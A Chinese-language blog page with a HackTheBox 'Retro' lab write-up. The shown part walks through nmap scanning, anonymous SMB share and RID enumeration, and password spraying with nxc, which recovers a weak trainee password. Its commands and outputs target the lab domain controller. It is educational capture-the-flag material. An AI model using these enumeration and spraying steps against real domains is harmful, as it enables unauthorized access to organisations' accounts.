<!DOCTYPE html>
<html lang=zh>
<head>
    <!-- Google Fonts -->
    <link rel="stylesheet" type="text/css" href="https://cdn.jsdelivr.net/npm/cn-fontsource-lxgw-wen-kai-screen-r/font.css">
    <link rel="stylesheet" type="text/css" href="https://fonts.font.im/css?family=Inconsolata:normal,bold">
    <!-- so meta -->
    <meta charset="utf-8">
    <meta http-equiv="X-UA-Compatible" content="IE=edge">
    <meta name="HandheldFriendly" content="True">
    <meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=5" />
    <meta name="description" content="这个机器是Vulnlab的，现在变成HackTheBox的了另外，针对blog的情况是我在瞎调试，最终样式不要期待  nmap123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051525354555657585960616263646566676869707172">
<meta property="og:type" content="article">
<meta property="og:title" content="HackTheBox——HTB Retro Writeup">
<meta property="og:url" content="https://n0nome.github.io/2025/06/27/Retro/Retro/index.html">
<meta property="og:site_name" content="N0nome&#96;s Fucking Life">
<meta property="og:description" content="这个机器是Vulnlab的，现在变成HackTheBox的了另外，针对blog的情况是我在瞎调试，最终样式不要期待  nmap123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051525354555657585960616263646566676869707172">
<meta property="og:locale" content="zh_CN">
<meta property="og:image" content="https://n0nome.github.io/images/retro.png">
<meta property="og:image" content="https://n0nome.github.io/images/retro-1.png">
<meta property="og:image" content="https://n0nome.github.io/images/retro-2.png">
<meta property="article:published_time" content="2025-06-27T13:08:37.569Z">
<meta property="article:modified_time" content="2025-06-27T13:08:37.705Z">
<meta property="article:author" content="n0nome">
<meta property="article:tag" content="writeup">
<meta name="twitter:card" content="summary">
<meta name="twitter:image" content="https://n0nome.github.io/images/retro.png">
    
    
      
        
          <link rel="shortcut icon" href="/images/laojun.jpg">
        
      
      
        
          <link rel="icon" type="image/png" href="/images/laojun.jpg" sizes="192x192">
        
      
      
        
          <link rel="apple-touch-icon" sizes="180x180" href="/images/laojun.jpg">
        
      
    
    <!-- title -->
    <title>HackTheBox——HTB Retro Writeup</title>
    <!-- async scripts -->
    <!-- Google Analytics -->

  <script async src="https://www.googletagmanager.com/gtag/js?id=G-RXS95XH60B"></script>
  <script>
      window.dataLayer = window.dataLayer || [];
      function gtag(){dataLayer.push(arguments);}
      gtag('js', new Date());
      gtag('config', 'G-RXS95XH60B');
  </script>


    <!-- Umami Analytics -->


    <!-- styles -->
    
<link rel="stylesheet" href="/css/style.css">

    <!-- persian styles -->
    
    <!-- rss -->
    
    
	<!-- mathjax -->
	
    
      <link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/@fancyapps/ui@4.0/dist/fancybox.css" />
    
<meta name="generator" content="Hexo 7.3.0"></head>

<body class="max-width mx-auto px3 ltr">
    
      <div id="header-post">
  <a id="menu-icon" href="#" aria-label="目录"><i class="fa-solid fa-bars fa-lg"></i></a>
  <a id="menu-icon-tablet" href="#" aria-label="目录"><i class="fa-solid fa-bars fa-lg"></i></a>
  <a id="top-icon-tablet" href="#" aria-label="顶部" onclick="$('html, body').animate({ scrollTop: 0 }, 'fast');" style="display:none;"><i class="fa-solid fa-chevron-up fa-lg"></i></a>
  <span id="menu">
    <span id="nav">
      <ul>
        <!--
       --><li><a href="/">首页</a></li><!--
     --><!--
       --><li><a href="/about/">关于</a></li><!--
     --><!--
       --><li><a href="https://n0nome.github.io/tags/writeup/">writeup</a></li><!--
     --><!--
       --><li><a href="https://n0nome.github.io/tags/random/">random</a></li><!--
     -->
      </ul>
    </span>
    <br/>
    <span id="actions">
      <ul>
        
        <li><a class="icon" aria-label="上一篇" href="/2025/07/02/Rustykey/RustyKey/"><i class="fa-solid fa-chevron-left" aria-hidden="true" onmouseover="$('#i-prev').toggle();" onmouseout="$('#i-prev').toggle();"></i></a></li>
        
        
        <li><a class="icon" aria-label="下一篇" href="/2025/06/26/arch&nix/Arch%20&%20Nix/"><i class="fa-solid fa-chevron-right" aria-hidden="true" onmouseover="$('#i-next').toggle();" onmouseout="$('#i-next').toggle();"></i></a></li>
        
        <li><a class="icon" aria-label="返回顶部" href="#" onclick="$('html, body').animate({ scrollTop: 0 }, 'fast');"><i class="fa-solid fa-chevron-up" aria-hidden="true" onmouseover="$('#i-top').toggle();" onmouseout="$('#i-top').toggle();"></i></a></li>
        <li><a class="icon" aria-label="分享文章" href="#"><i class="fa-solid fa-share-alt" aria-hidden="true" onmouseover="$('#i-share').toggle();" onmouseout="$('#i-share').toggle();" onclick="$('#share').toggle();return false;"></i></a></li>
      </ul>
      <span id="i-prev" class="info" style="display:none;">上一篇</span>
      <span id="i-next" class="info" style="display:none;">下一篇</span>
      <span id="i-top" class="info" style="display:none;">返回顶部</span>
      <span id="i-share" class="info" style="display:none;">分享文章</span>
    </span>
    <br/>
    <div id="share" style="display: none">
      <ul>
  <li><a class="icon" target="_blank" rel="noopener" href="http://www.facebook.com/sharer.php?u=https://n0nome.github.io/2025/06/27/Retro/Retro/"><i class="fab fa-facebook " aria-hidden="true"></i></a></li>
  <li><a class="icon" target="_blank" rel="noopener" href="https://twitter.com/share?url=https://n0nome.github.io/2025/06/27/Retro/Retro/&text=HackTheBox——HTB Retro Writeup"><i class="fab fa-twitter " aria-hidden="true"></i></a></li>
  <li><a class="icon" target="_blank" rel="noopener" href="http://www.linkedin.com/shareArticle?url=https://n0nome.github.io/2025/06/27/Retro/Retro/&title=HackTheBox——HTB Retro Writeup"><i class="fab fa-linkedin " aria-hidden="true"></i></a></li>
  <li><a class="icon" target="_blank" rel="noopener" href="https://pinterest.com/pin/create/bookmarklet/?url=https://n0nome.github.io/2025/06/27/Retro/Retro/&is_video=false&description=HackTheBox——HTB Retro Writeup"><i class="fab fa-pinterest " aria-hidden="true"></i></a></li>
  <li><a class="icon" href="mailto:?subject=HackTheBox——HTB Retro Writeup&body=Check out this article: https://n0nome.github.io/2025/06/27/Retro/Retro/"><i class="fa-solid fa-envelope " aria-hidden="true"></i></a></li>
  <li><a class="icon" target="_blank" rel="noopener" href="https://getpocket.com/save?url=https://n0nome.github.io/2025/06/27/Retro/Retro/&title=HackTheBox——HTB Retro Writeup"><i class="fab fa-get-pocket " aria-hidden="true"></i></a></li>
  <li><a class="icon" target="_blank" rel="noopener" href="http://reddit.com/submit?url=https://n0nome.github.io/2025/06/27/Retro/Retro/&title=HackTheBox——HTB Retro Writeup"><i class="fab fa-reddit " aria-hidden="true"></i></a></li>
  <li><a class="icon" target="_blank" rel="noopener" href="http://www.stumbleupon.com/submit?url=https://n0nome.github.io/2025/06/27/Retro/Retro/&title=HackTheBox——HTB Retro Writeup"><i class="fab fa-stumbleupon " aria-hidden="true"></i></a></li>
  <li><a class="icon" target="_blank" rel="noopener" href="http://digg.com/submit?url=https://n0nome.github.io/2025/06/27/Retro/Retro/&title=HackTheBox——HTB Retro Writeup"><i class="fab fa-digg " aria-hidden="true"></i></a></li>
  <li><a class="icon" target="_blank" rel="noopener" href="http://www.tumblr.com/share/link?url=https://n0nome.github.io/2025/06/27/Retro/Retro/&name=HackTheBox——HTB Retro Writeup&description="><i class="fab fa-tumblr " aria-hidden="true"></i></a></li>
  <li><a class="icon" target="_blank" rel="noopener" href="https://news.ycombinator.com/submitlink?u=https://n0nome.github.io/2025/06/27/Retro/Retro/&t=HackTheBox——HTB Retro Writeup"><i class="fab fa-hacker-news " aria-hidden="true"></i></a></li>
</ul>

    </div>

    

    
      <!-- 如果文章被加密，初始隐藏目录 -->
      <div id="toc" style="">
        <ol class="toc"><li class="toc-item toc-level-2"><a class="toc-link" href="#nmap"><span class="toc-number">1.</span> <span class="toc-text">nmap</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#smb-share"><span class="toc-number">1.1.</span> <span class="toc-text">smb share</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#Password-Spraying"><span class="toc-number">1.2.</span> <span class="toc-text">Password Spraying</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#pre-created-computer-account-passwd-change"><span class="toc-number">1.3.</span> <span class="toc-text">pre created computer account passwd change</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#shell-as-BANKING"><span class="toc-number">2.</span> <span class="toc-text">shell as BANKING$</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#ESC1"><span class="toc-number">2.1.</span> <span class="toc-text">ESC1</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#shell-as-root"><span class="toc-number">3.</span> <span class="toc-text">shell as root</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#hashes"><span class="toc-number">3.1.</span> <span class="toc-text">hashes</span></a></li></ol></li></ol>
      </div>
     
 </span>
</div>

    
    <div class="content index py4 ">
        
        <article class="post h-entry" itemscope itemtype="http://schema.org/BlogPosting">
  <header>
    
    <h1 class="posttitle p-name" itemprop="name headline">
        HackTheBox——HTB Retro Writeup
    </h1>



    <div class="meta">
      <span class="author p-author h-card" itemprop="author" itemscope itemtype="http://schema.org/Person">
        <span class="p-name" itemprop="name">n0nome</span>
      </span>
      
    <div class="postdate">
      
        <time datetime="2025-06-27T13:08:37.569Z" class="dt-published" itemprop="datePublished">2025-06-27</time>
        
        (Updated: <time datetime="2025-06-27T13:08:37.705Z" class="dt-updated" itemprop="dateModified">2025-06-27</time>)
        
      
    </div>


      

      
    <div class="article-tag">
        <i class="fa-solid fa-tag"></i>
        <a class="p-category" href="/tags/writeup/" rel="tag">writeup</a>
    </div>


    </div>
  </header>
  

  <div class="content e-content" itemprop="articleBody">
    <p><a data-fancybox="gallery" data-src="/images/retro.png" data-caption=""><img src="/images/retro.png"></a></p>
<blockquote>
<p>这个机器是Vulnlab的，现在变成HackTheBox的了<br>另外，针对blog的情况是我在瞎调试，最终样式不要期待</p>
</blockquote>
<h2 id="nmap"><a href="#nmap" class="headerlink" title="nmap"></a>nmap</h2><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br></pre></td><td class="code"><pre><span class="line">PORT      STATE SERVICE       VERSION                                                                                         </span><br><span class="line">53/tcp    open  domain        dnsmasq 2.51</span><br><span class="line">| dns-nsid:         </span><br><span class="line">|_  bind.version: dnsmasq-2.51</span><br><span class="line">88/tcp    open  kerberos-sec  Microsoft Windows Kerberos (server <span class="keyword">time</span>: 2025-06-27 06:53:33Z)</span><br><span class="line">135/tcp   open  msrpc         Microsoft Windows RPC</span><br><span class="line">139/tcp   open  netbios-ssn   Microsoft Windows netbios-ssn</span><br><span class="line">389/tcp   open  ldap          Microsoft Windows Active Directory LDAP (Domain: retro.vl0., Site: Default-First-Site-Name)</span><br><span class="line">|_ssl-<span class="built_in">date</span>: TLS randomness does not represent <span class="keyword">time</span></span><br><span class="line">| ssl-cert: Subject: commonName=DC.retro.vl</span><br><span class="line">| Subject Alternative Name: othername: 1.3.6.1.4.1.311.25.1:&lt;unsupported&gt;, DNS:DC.retro.vl</span><br><span class="line">| Not valid before: 2024-10-02T10:33:09</span><br><span class="line">|_Not valid after:  2025-10-02T10:33:09</span><br><span class="line">445/tcp   open  microsoft-ds?</span><br><span class="line">464/tcp   open  kpasswd5?   </span><br><span class="line">593/tcp   open  ncacn_http    Microsoft Windows RPC over HTTP 1.0</span><br><span class="line">636/tcp   open  ssl/ldap      Microsoft Windows Active Directory LDAP (Domain: retro.vl0., Site: Default-First-Site-Name)</span><br><span class="line">| ssl-cert: Subject: commonName=DC.retro.vl                  </span><br><span class="line">| Subject Alternative Name: othername: 1.3.6.1.4.1.311.25.1:&lt;unsupported&gt;, DNS:DC.retro.vl</span><br><span class="line">| Not valid before: 2024-10-02T10:33:09</span><br><span class="line">|_Not valid after:  2025-10-02T10:33:09</span><br><span class="line">|_ssl-<span class="built_in">date</span>: TLS randomness does not represent <span class="keyword">time</span></span><br><span class="line">3268/tcp  open  ldap          Microsoft Windows Active Directory LDAP (Domain: retro.vl0., Site: Default-First-Site-Name)</span><br><span class="line">| ssl-cert: Subject: commonName=DC.retro.vl</span><br><span class="line">| Subject Alternative Name: othername: 1.3.6.1.4.1.311.25.1:&lt;unsupported&gt;, DNS:DC.retro.vl</span><br><span class="line">| Not valid before: 2024-10-02T10:33:09</span><br><span class="line">|_Not valid after:  2025-10-02T10:33:09</span><br><span class="line">|_ssl-<span class="built_in">date</span>: TLS randomness does not represent <span class="keyword">time</span></span><br><span class="line">3269/tcp  open  ssl/ldap      Microsoft Windows Active Directory LDAP (Domain: retro.vl0., Site: Default-First-Site-Name)</span><br><span class="line">| ssl-cert: Subject: commonName=DC.retro.vl</span><br><span class="line">| Subject Alternative Name: othername: 1.3.6.1.4.1.311.25.1:&lt;unsupported&gt;, DNS:DC.retro.vl</span><br><span class="line">| Not valid before: 2024-10-02T10:33:09</span><br><span class="line">|_Not valid after:  2025-10-02T10:33:09</span><br><span class="line">|_ssl-<span class="built_in">date</span>: TLS randomness does not represent <span class="keyword">time</span></span><br><span class="line">3389/tcp  open  ms-wbt-server Microsoft Terminal Services</span><br><span class="line">|_ssl-<span class="built_in">date</span>: 2025-06-27T06:55:10+00:00; 0s from scanner <span class="keyword">time</span>.</span><br><span class="line">| ssl-cert: Subject: commonName=DC.retro.vl</span><br><span class="line">| Not valid before: 2025-04-08T01:55:44</span><br><span class="line">|_Not valid after:  2025-10-08T01:55:44</span><br><span class="line">| rdp-ntlm-info: </span><br><span class="line">|   Target_Name: RETRO</span><br><span class="line">|   NetBIOS_Domain_Name: RETRO</span><br><span class="line">|   NetBIOS_Computer_Name: DC</span><br><span class="line">|   DNS_Domain_Name: retro.vl</span><br><span class="line">|   DNS_Computer_Name: DC.retro.vl</span><br><span class="line">|   Product_Version: 10.0.20348</span><br><span class="line">|_  System_Time: 2025-06-27T06:54:30+00:00</span><br><span class="line">5985/tcp  open  http          Microsoft HTTPAPI httpd 2.0 (SSDP/UPnP)</span><br><span class="line">|_http-server-header: Microsoft-HTTPAPI/2.0</span><br><span class="line">|_http-title: Not Found</span><br><span class="line">9389/tcp  open  mc-nmf        .NET Message Framing</span><br><span class="line">49664/tcp open  msrpc         Microsoft Windows RPC</span><br><span class="line">49667/tcp open  msrpc         Microsoft Windows RPC</span><br><span class="line">49668/tcp open  msrpc         Microsoft Windows RPC</span><br><span class="line">53852/tcp open  msrpc         Microsoft Windows RPC</span><br><span class="line">58198/tcp open  ncacn_http    Microsoft Windows RPC over HTTP 1.0</span><br><span class="line">58205/tcp open  msrpc         Microsoft Windows RPC</span><br><span class="line">58222/tcp open  msrpc         Microsoft Windows RPC</span><br><span class="line">58225/tcp open  msrpc         Microsoft Windows RPC</span><br><span class="line">Warning: OSScan results may be unreliable because we could not find at least 1 open and 1 closed port</span><br><span class="line">Device <span class="built_in">type</span>: general purpose|storage-misc</span><br><span class="line">Running (JUST GUESSING): Linux 5.X|3.X|4.X (93%), Synology DiskStation Manager 6.X (87%)</span><br><span class="line">OS CPE: cpe:/o:linux:linux_kernel:5.13 cpe:/o:linux:linux_kernel:3 cpe:/o:linux:linux_kernel:3.10 cpe:/a:synology:diskstation_manager:6 cpe:/o:linux:linux_kernel:4.1</span><br><span class="line">Aggressive OS guesses: Linux 5.13 (93%), Linux 3.1 - 3.2 (87%), Synology DiskStation Manager 6 (Linux 3.10) (87%), Linux 4.1 (87%), Linux 4.12 (87%), Linux 3.12 (85%)</span><br><span class="line">No exact OS matches <span class="keyword">for</span> host (<span class="built_in">test</span> conditions non-ideal).</span><br><span class="line">Network Distance: 3 hops</span><br><span class="line">Service Info: Host: DC; OS: Windows; CPE: cpe:/o:microsoft:windows</span><br><span class="line"></span><br><span class="line">Host script results:</span><br><span class="line">| smb2-security-mode: </span><br><span class="line">|   3:1:1: </span><br><span class="line">|_    Message signing enabled and required</span><br><span class="line">| smb2-time: </span><br><span class="line">|   <span class="built_in">date</span>: 2025-06-27T06:54:31</span><br><span class="line">|_  start_date: N/A</span><br></pre></td></tr></table></figure>

<p>先加hosts</p>
<h3 id="smb-share"><a href="#smb-share" class="headerlink" title="smb share"></a>smb share</h3><p>nxc看看有没有匿名登陆</p>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">└─$ nxc smb <span class="variable">$IP</span> -u anonymous -p <span class="string">&#x27;&#x27;</span> </span><br><span class="line">SMB         10.129.201.124  445    DC               [*] Windows Server 2022 Build 20348 x64 (name:DC) (domain:retro.vl) (signing:True) (SMBv1:False) </span><br><span class="line">SMB         10.129.201.124  445    DC               [+] retro.vl\anonymous: (Guest)</span><br></pre></td></tr></table></figure>
<p>枚举一下共享的目录</p>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line">└─$ nxc smb <span class="variable">$IP</span> -u anonymous -p <span class="string">&#x27;&#x27;</span> --shares</span><br><span class="line">SMB         10.129.201.124  445    DC               [*] Windows Server 2022 Build 20348 x64 (name:DC) (domain:retro.vl) (signing:True) (SMBv1:False) </span><br><span class="line">SMB         10.129.201.124  445    DC               [+] retro.vl\anonymous: (Guest)</span><br><span class="line">SMB         10.129.201.124  445    DC               [*] Enumerated shares</span><br><span class="line">SMB         10.129.201.124  445    DC               Share           Permissions     Remark</span><br><span class="line">SMB         10.129.201.124  445    DC               -----           -----------     ------</span><br><span class="line">SMB         10.129.201.124  445    DC               ADMIN$                          Remote Admin</span><br><span class="line">SMB         10.129.201.124  445    DC               C$                              Default share</span><br><span class="line">SMB         10.129.201.124  445    DC               IPC$            READ            Remote IPC</span><br><span class="line">SMB         10.129.201.124  445    DC               NETLOGON                        Logon server share </span><br><span class="line">SMB         10.129.201.124  445    DC               Notes                           </span><br><span class="line">SMB         10.129.201.124  445    DC               SYSVOL                          Logon server share </span><br><span class="line">SMB         10.129.201.124  445    DC               Trainees        READ            </span><br></pre></td></tr></table></figure>

<p>有两个可读，看下面那个<code>Trainess</code>有什么</p>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br></pre></td><td class="code"><pre><span class="line">└─$ smbclient //10.129.201.124/Trainees -U anonymous</span><br><span class="line">Password <span class="keyword">for</span> [WORKGROUP\anonymous]:</span><br><span class="line">Try <span class="string">&quot;help&quot;</span> to get a list of possible commands.</span><br><span class="line">smb: \&gt; <span class="built_in">ls</span> -la</span><br><span class="line">NT_STATUS_NO_SUCH_FILE listing \-la</span><br><span class="line">smb: \&gt; <span class="built_in">ls</span></span><br><span class="line">  .                                   D        0  Sun Jul 23 21:58:43 2023</span><br><span class="line">  ..                                DHS        0  Wed Jun 11 14:17:10 2025</span><br><span class="line">  Important.txt                       A      288  Sun Jul 23 22:00:13 2023</span><br><span class="line"></span><br><span class="line">                4659711 blocks of size 4096. 1280755 blocks available</span><br><span class="line">smb: \&gt; prompt </span><br><span class="line">smb: \&gt; get Important.txt</span><br><span class="line">getting file \Important.txt of size 288 as Important.txt (0.2 KiloBytes/sec) (average 0.2 KiloBytes/sec)</span><br><span class="line"></span><br><span class="line"><span class="comment"># Important.txt</span></span><br><span class="line">└─$ <span class="built_in">cat</span> Important.txt </span><br><span class="line">Dear Trainees,</span><br><span class="line"></span><br><span class="line">I know that some of you seemed to struggle with remembering strong and unique passwords.</span><br><span class="line">So we decided to bundle every one of you up into one account.</span><br><span class="line">Stop bothering us. Please. We have other stuff to <span class="keyword">do</span> than resetting your password every day.</span><br><span class="line"></span><br><span class="line">Regards</span><br><span class="line"></span><br><span class="line">The Admins          </span><br><span class="line">亲爱的学员们：</span><br><span class="line"></span><br><span class="line">我知道你们中的一些人似乎很难记住安全且独特的密码。</span><br><span class="line">所以我们决定将你们所有人的密码集中到一个账户中。</span><br><span class="line">拜托，别再来烦我们了。除了每天重置密码，我们还有其他事情要做。</span><br><span class="line"></span><br><span class="line">此致</span><br><span class="line"></span><br><span class="line">管理员们</span><br></pre></td></tr></table></figure>

<h3 id="Password-Spraying"><a href="#Password-Spraying" class="headerlink" title="Password Spraying"></a>Password Spraying</h3><p>放到一个账户里，拜托是哪个账户<br>nxc再枚举一下</p>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br></pre></td><td class="code"><pre><span class="line">└─$ nxc smb <span class="variable">$IP</span> -u anonymous -p <span class="string">&#x27;&#x27;</span> --rid-brute</span><br><span class="line">SMB         10.129.201.124  445    DC               [*] Windows Server 2022 Build 20348 x64 (name:DC) (domain:retro.vl) (signing:True) (SMBv1:False) </span><br><span class="line">SMB         10.129.201.124  445    DC               [+] retro.vl\anonymous: (Guest)</span><br><span class="line">SMB         10.129.201.124  445    DC               498: RETRO\Enterprise Read-only Domain Controllers (SidTypeGroup)</span><br><span class="line">SMB         10.129.201.124  445    DC               500: RETRO\Administrator (SidTypeUser)</span><br><span class="line">SMB         10.129.201.124  445    DC               501: RETRO\Guest (SidTypeUser)</span><br><span class="line">SMB         10.129.201.124  445    DC               502: RETRO\krbtgt (SidTypeUser)</span><br><span class="line">SMB         10.129.201.124  445    DC               512: RETRO\Domain Admins (SidTypeGroup)</span><br><span class="line">SMB         10.129.201.124  445    DC               513: RETRO\Domain Users (SidTypeGroup)</span><br><span class="line">SMB         10.129.201.124  445    DC               514: RETRO\Domain Guests (SidTypeGroup)</span><br><span class="line">SMB         10.129.201.124  445    DC               515: RETRO\Domain Computers (SidTypeGroup)</span><br><span class="line">SMB         10.129.201.124  445    DC               516: RETRO\Domain Controllers (SidTypeGroup)</span><br><span class="line">SMB         10.129.201.124  445    DC               517: RETRO\Cert Publishers (SidTypeAlias)</span><br><span class="line">SMB         10.129.201.124  445    DC               518: RETRO\Schema Admins (SidTypeGroup)</span><br><span class="line">SMB         10.129.201.124  445    DC               519: RETRO\Enterprise Admins (SidTypeGroup)</span><br><span class="line">SMB         10.129.201.124  445    DC               520: RETRO\Group Policy Creator Owners (SidTypeGroup)</span><br><span class="line">SMB         10.129.201.124  445    DC               521: RETRO\Read-only Domain Controllers (SidTypeGroup)</span><br><span class="line">SMB         10.129.201.124  445    DC               522: RETRO\Cloneable Domain Controllers (SidTypeGroup)</span><br><span class="line">SMB         10.129.201.124  445    DC               525: RETRO\Protected Users (SidTypeGroup)</span><br><span class="line">SMB         10.129.201.124  445    DC               526: RETRO\Key Admins (SidTypeGroup)</span><br><span class="line">SMB         10.129.201.124  445    DC               527: RETRO\Enterprise Key Admins (SidTypeGroup)</span><br><span class="line">SMB         10.129.201.124  445    DC               553: RETRO\RAS and IAS Servers (SidTypeAlias)</span><br><span class="line">SMB         10.129.201.124  445    DC               571: RETRO\Allowed RODC Password Replication Group (SidTypeAlias)</span><br><span class="line">SMB         10.129.201.124  445    DC               572: RETRO\Denied RODC Password Replication Group (SidTypeAlias)</span><br><span class="line">SMB         10.129.201.124  445    DC               1000: RETRO\DC$ (SidTypeUser)</span><br><span class="line">SMB         10.129.201.124  445    DC               1101: RETRO\DnsAdmins (SidTypeAlias)</span><br><span class="line">SMB         10.129.201.124  445    DC               1102: RETRO\DnsUpdateProxy (SidTypeGroup)</span><br><span class="line">SMB         10.129.201.124  445    DC               1104: RETRO\trainee (SidTypeUser)</span><br><span class="line">SMB         10.129.201.124  445    DC               1106: RETRO\BANKING$ (SidTypeUser)</span><br><span class="line">SMB         10.129.201.124  445    DC               1107: RETRO\jburley (SidTypeUser)</span><br><span class="line">SMB         10.129.201.124  445    DC               1108: RETRO\HelpDesk (SidTypeGroup)</span><br><span class="line">SMB         10.129.201.124  445    DC               1109: RETRO\tblack (SidTypeUser)</span><br></pre></td></tr></table></figure>

<p>精简一下可以得到</p>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">Administrator                                                                                                               </span><br><span class="line">Guest                                                                                                                         </span><br><span class="line">krbtgt                                                                                                                        </span><br><span class="line">DC$                                                                                                                           </span><br><span class="line">trainee                                                                                                                       </span><br><span class="line">BANKING$                                                                                                                      </span><br><span class="line">jburley                                                                                                                       </span><br><span class="line">tblack  </span><br></pre></td></tr></table></figure>

<p>直接喷射一下</p>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">└─$ nxc smb <span class="variable">$IP</span> -u user.list -p user.list --continue-on-success</span><br><span class="line">SMB         10.129.201.124  445    DC               [+] retro.vl\trainee:trainee </span><br></pre></td></tr></table></figure>

<p>出来一个<br>看一下可以访问哪些目录</p>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line">└─$ nxc smb <span class="variable">$IP</span> -u trainee -p trainee --shares</span><br><span class="line">SMB         10.129.201.124  445    DC               [*] Windows Server 2022 Build 20348 x64 (name:DC) (domain:retro.vl) (signing:True) (SMBv1:False) </span><br><span class="line">SMB         10.129.201.124  445    DC               [+] retro.vl\trainee:trainee </span><br><span class="line">SMB         10.129.201.124  445    DC               [*] Enumerated shares</span><br><span class="line">SMB         10.129.201.124  445    DC               Share           Permissions     Remark</span><br><span class="line">SMB         10.129.201.124  445    DC               -----           -----------     ------</span><br><span class="line">SMB         10.129.201.124  445    DC               ADMIN$                          Remote Admin</span><br><span class="line">SMB         10.129.201.124  445    DC               C$                              Default share</span><br><span class="line">SMB         10.129.201.124  445    DC               IPC$            READ            Remote IPC</span><br><span class="line">SMB         10.129.201.124  445    DC               NETLOGON        READ            Logon server share </span><br><span class="line">SMB         10.129.201.124  445    DC               Notes           READ            </span><br><span class="line">SMB         10.129.201.124  445    DC               SYSVOL          READ            Logon server share </span><br><span class="line">SMB         10.129.201.124  445    DC               Trainees        READ            </span><br></pre></td></tr></table></figure>

<h3 id="pre-created-computer-account-passwd-change"><a href="#pre-created-computer-account-passwd-change" class="headerlink" title="pre created computer account passwd change"></a>pre created computer account passwd change</h3><p>多出来一个<code>Notes</code>，进去读一下</p>
